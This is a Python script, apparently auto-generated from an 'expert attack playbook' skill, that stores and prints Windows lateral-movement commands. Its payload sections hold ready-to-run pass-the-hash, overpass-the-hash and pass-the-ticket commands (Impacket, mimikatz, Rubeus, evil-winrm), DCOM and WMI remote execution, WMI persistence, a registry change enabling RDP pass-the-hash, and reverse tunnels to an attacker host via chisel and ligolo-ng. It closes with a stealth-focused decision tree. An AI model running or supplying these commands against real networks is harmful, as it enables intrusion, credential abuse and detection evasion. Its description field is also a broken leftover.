#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: hack-skills/windows-lateral-movement

Skill: SKILL: Windows Lateral Movement — Expert Attack Playbook
Desc : >-

Run:  python hack-skills-windows-lateral-movement.py --help
      python hack-skills-windows-lateral-movement.py --list
      python hack-skills-windows-lateral-movement.py --dump <section>
"""
import sys, json, argparse

NAME = 'hack-skills/windows-lateral-movement'
TITLE = 'SKILL: Windows Lateral Movement — Expert Attack Playbook'
DESCRIPTION = '>-'

PAYLOADS = {
    'main': ["name: windows-lateral-movement", "description: >-", "Windows lateral movement playbook. Use when pivoting between Windows hosts via PsExec, WMI, WinRM, DCOM, RDP, pass-the-hash, overpass-the-hash, or pass-the-ticket techniques."],
    'skill-windows-lateral-movement-expert-attack-playbook': [],
    '0-related-routing': ["Before going deep, consider loading:", "- [windows-privilege-escalation](../windows-privilege-escalation/SKILL.md) after landing on a new host for local escalation", "- [windows-av-evasion](../windows-av-evasion/SKILL.md) when EDR blocks lateral movement tools", "- [active-directory-kerberos-attacks](../active-directory-kerberos-attacks/SKILL.md) for Kerberos-based lateral (pass-the-ticket, delegation)", "- [active-directory-acl-abuse](../active-directory-acl-abuse/SKILL.md) for ACL-based paths to new hosts"],
    'advanced-reference': ["Also load [CREDENTIAL_DUMPING.md](./CREDENTIAL_DUMPING.md) when you need:", "- LSASS dump techniques (MiniDump, comsvcs.dll, nanodump)", "- SAM/SYSTEM/SECURITY extraction", "- DPAPI, credential manager, cached domain credentials", "- NTDS.dit extraction methods"],
    '1-remote-execution-methods-comparison': [],
    '2-psexec-variants': [],
    'impacket-psexec': ["```bash"],
    'with-password': ["psexec.py DOMAIN/administrator:password@TARGET_IP"],
    'with-ntlm-hash-pass-the-hash': ["psexec.py -hashes :NTLM_HASH DOMAIN/administrator@TARGET_IP"],
    'with-kerberos-ticket': ["export KRB5CCNAME=admin.ccache", "psexec.py -k -no-pass DOMAIN/administrator@target.domain.com"],
    'impacket-smbexec-stealthier-no-binary-upload': ["```bash", "smbexec.py DOMAIN/administrator:password@TARGET_IP", "smbexec.py -hashes :NTLM_HASH DOMAIN/administrator@TARGET_IP"],
    'impacket-atexec-scheduled-task': ["```bash", "atexec.py DOMAIN/administrator:password@TARGET_IP \"whoami\"", "atexec.py -hashes :NTLM_HASH DOMAIN/administrator@TARGET_IP \"whoami\""],
    'sysinternals-psexec': ["```cmd", "PsExec64.exe \\\\TARGET -u DOMAIN\\administrator -p password cmd.exe", "PsExec64.exe \\\\TARGET -s cmd.exe    & REM Run as SYSTEM (-s)", "PsExec64.exe \\\\TARGET -accepteula -s -d cmd.exe /c \"C:\\temp\\payload.exe\""],
    '3-wmi-lateral-movement': ["```bash"],
    'impacket-wmiexec': ["wmiexec.py DOMAIN/administrator:password@TARGET_IP", "wmiexec.py -hashes :NTLM_HASH DOMAIN/administrator@TARGET_IP"],
    'with-kerberos': ["export KRB5CCNAME=admin.ccache", "wmiexec.py -k -no-pass DOMAIN/administrator@target.domain.com", "```powershell"],
    'powershell-wmi-process-creation': ["Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList \"cmd.exe /c whoami > C:\\temp\\out.txt\" -ComputerName TARGET -Credential $cred"],
    'wmi-event-subscription-persistence': ["$filterArgs = @{", "EventNamespace = 'root\\cimv2'; Name = 'Updater';", "QueryLanguage = 'WQL';", "Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\"", "$filter = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments $filterArgs"],
    '4-winrm-lateral-movement': ["```bash"],
    'evil-winrm-from-linux-with-password': ["evil-winrm -i TARGET_IP -u administrator -p password"],
    'evil-winrm-with-hash': ["evil-winrm -i TARGET_IP -u administrator -H NTLM_HASH"],
    'evil-winrm-with-kerberos': ["evil-winrm -i target.domain.com -r DOMAIN.COM", "```powershell"],
    'powershell-remoting': ["$cred = Get-Credential", "Enter-PSSession -ComputerName TARGET -Credential $cred"],
    'execute-command-remotely': ["Invoke-Command -ComputerName TARGET -Credential $cred -ScriptBlock { whoami }"],
    'multiple-targets-simultaneously': ["Invoke-Command -ComputerName TARGET1,TARGET2 -Credential $cred -ScriptBlock { hostname; whoami }"],
    '5-dcom-lateral-movement': ["Stealthy \u2014 uses legitimate COM objects, no service creation."],
    'mmc20-application': ["```powershell", "$com = [activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application\",\"TARGET\"))", "$com.Document.ActiveView.ExecuteShellCommand(\"cmd.exe\",$null,\"/c whoami > C:\\temp\\out.txt\",\"7\")"],
    'shellwindows': ["```powershell", "$com = [activator]::CreateInstance([type]::GetTypeFromCLSID(\"9BA05972-F6A8-11CF-A442-00A0C90A8F39\",\"TARGET\"))", "$item = $com.Item()", "$item.Document.Application.ShellExecute(\"cmd.exe\",\"/c whoami > C:\\temp\\out.txt\",\"C:\\Windows\\System32\",$null,0)"],
    'shellbrowserwindow': ["```powershell", "$com = [activator]::CreateInstance([type]::GetTypeFromCLSID(\"C08AFD90-F2A1-11D1-8455-00A0C91F3880\",\"TARGET\"))", "$com.Document.Application.ShellExecute(\"cmd.exe\",\"/c calc.exe\",\"C:\\Windows\\System32\",$null,0)"],
    'impacket-dcomexec': ["```bash", "dcomexec.py DOMAIN/administrator:password@TARGET_IP", "dcomexec.py -hashes :NTLM_HASH DOMAIN/administrator@TARGET_IP -object MMC20"],
    '6-pass-the-hash-pth': ["Use NTLM hash directly without knowing the plaintext password.", "```bash"],
    'crackmapexec-spray-check-admin-access': ["crackmapexec smb TARGETS -u administrator -H NTLM_HASH"],
    'impacket-tools-all-support-hashes': ["psexec.py -hashes :NTLM_HASH DOMAIN/user@TARGET", "wmiexec.py -hashes :NTLM_HASH DOMAIN/user@TARGET", "smbexec.py -hashes :NTLM_HASH DOMAIN/user@TARGET"],
    'evil-winrm': ["evil-winrm -i TARGET -u user -H NTLM_HASH"],
    'xfreerdp-restricted-admin-mode-must-be-enabled': ["xfreerdp /v:TARGET /u:administrator /pth:NTLM_HASH /d:DOMAIN", "```cmd"],
    'mimikatz-pth-spawns-new-process-with-injected-creds': ["sekurlsa::pth /user:administrator /domain:DOMAIN /ntlm:HASH /run:cmd.exe"],
    'enable-restricted-admin-for-rdp-pth': ["```cmd"],
    'on-target-requires-admin-enable-restricted-admin': ["reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f"],
    '7-overpass-the-hash-pass-the-key': ["Convert NTLM hash \u2192 Kerberos TGT \u2192 pure Kerberos authentication.", "```bash"],
    'request-tgt-with-hash': ["getTGT.py DOMAIN/user -hashes :NTLM_HASH -dc-ip DC_IP", "export KRB5CCNAME=user.ccache"],
    'or-with-aes256-key': ["getTGT.py DOMAIN/user -aesKey AES256_KEY -dc-ip DC_IP"],
    'use-kerberos-for-all-subsequent-tools': ["psexec.py -k -no-pass DOMAIN/user@target.domain.com", "wmiexec.py -k -no-pass DOMAIN/user@target.domain.com", "```cmd"],
    'mimikatz-overpass-the-hash': ["sekurlsa::pth /user:user /domain:DOMAIN /ntlm:HASH /run:powershell.exe"],
    'new-powershell-session-klist-shows-kerberos-tgt': ["**Advantage**: Pure Kerberos auth avoids NTLM logging and detection."],
    '8-pass-the-ticket': ["```bash"],
    'use-existing-ccache-ticket': ["export KRB5CCNAME=/path/to/admin.ccache", "psexec.py -k -no-pass DOMAIN/admin@target.domain.com", "```cmd"],
    'mimikatz-inject-kirbi-ticket': ["kerberos::ptt ticket.kirbi"],
    'verify': ["klist"],
    'rubeus': ["Rubeus.exe ptt /ticket:base64_blob"],
    '9-pivoting-through-compromised-hosts': [],
    'ssh-tunnel-port-forward': ["```bash"],
    'dynamic-socks-proxy-through-compromised-host': ["ssh -D 1080 user@COMPROMISED_HOST"],
    'use-with-proxychains': [],
    'local-port-forward-access-internal-service': ["ssh -L 8888:INTERNAL_TARGET:445 user@COMPROMISED_HOST"],
    'chisel-no-ssh-needed': ["```bash"],
    'on-attacker-server': ["chisel server --reverse -p 8080"],
    'on-compromised-host-client': ["chisel client ATTACKER:8080 R:socks"],
    'creates-socks5-proxy-on-attacker-s-port-1080': [],
    'ligolo-ng-modern-fast': ["```bash"],
    'on-attacker': ["ligolo-proxy -selfcert -laddr 0.0.0.0:11601"],
    'on-compromised-host': ["ligolo-agent -connect ATTACKER:11601 -retry -ignore-cert"],
    'in-ligolo-console': ["session          # Select agent", "start            # Start tunnel"],
    'add-route-sudo-ip-route-add-internal-subnet-24-dev-ligolo': [],
    '10-lateral-movement-decision-tree': ["Have credentials / hash \u2014 need to move laterally", "\u251c\u2500\u2500 What credentials do you have?", "\u2502   \u251c\u2500\u2500 Plaintext password \u2192 any method", "\u2502   \u251c\u2500\u2500 NTLM hash \u2192 PTH methods (\u00a76)", "\u2502   \u2502   \u251c\u2500\u2500 Need stealthier? \u2192 Overpass-the-Hash first (\u00a77)", "\u2502   \u2502   \u2514\u2500\u2500 Direct use \u2192 psexec/wmiexec/evil-winrm with -H", "\u2502   \u251c\u2500\u2500 Kerberos ticket \u2192 Pass-the-Ticket (\u00a78)", "\u2502   \u2514\u2500\u2500 AES key \u2192 Overpass-the-Hash with -aesKey (\u00a77)", "\u251c\u2500\u2500 OPSEC priority?", "\u2502   \u251c\u2500\u2500 High stealth needed", "\u2502   \u2502   \u251c\u2500\u2500 WMI (no file on disk, no service) \u2192 wmiexec (\u00a73)", "\u2502   \u2502   \u251c\u2500\u2500 DCOM (uses legitimate COM) \u2192 dcomexec (\u00a75)", "\u2502   \u2502   \u2514\u2500\u2500 WinRM (PowerShell remoting) \u2192 evil-winrm (\u00a74)", "\u2502   \u251c\u2500\u2500 Moderate stealth", "\u2502   \u2502   \u251c\u2500\u2500 smbexec (no binary upload) (\u00a72)", "\u2502   \u2502   \u2514\u2500\u2500 atexec (scheduled task, auto-cleanup) (\u00a72)", "\u2502   \u2514\u2500\u2500 Low stealth acceptable", "\u2502       \u251c\u2500\u2500 PsExec (reliable, creates service) (\u00a72)", "\u2502       \u2514\u2500\u2500 RDP (interactive GUI) (\u00a76)", "\u251c\u2500\u2500 Need to pivot to internal network?", "\u2502   \u251c\u2500\u2500 SSH available \u2192 SSH tunnel / SOCKS (\u00a79)", "\u2502   \u251c\u2500\u2500 No SSH \u2192 Chisel or Ligolo-ng (\u00a79)", "\u2502   \u2514\u2500\u2500 Multiple hops \u2192 chain SOCKS proxies", "\u251c\u2500\u2500 Target hardening?", "\u2502   \u251c\u2500\u2500 SMB signing required \u2192 WMI, WinRM, or DCOM", "\u2502   \u251c\u2500\u2500 WinRM disabled \u2192 WMI or DCOM", "\u2502   \u251c\u2500\u2500 Firewall blocks 135/445 \u2192 RDP or SSH", "\u2502   \u2514\u2500\u2500 Restricted Admin disabled \u2192 no RDP PTH \u2192 use other methods", "\u2514\u2500\u2500 Need to dump creds on new host?", "\u2514\u2500\u2500 Load CREDENTIAL_DUMPING.md"],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()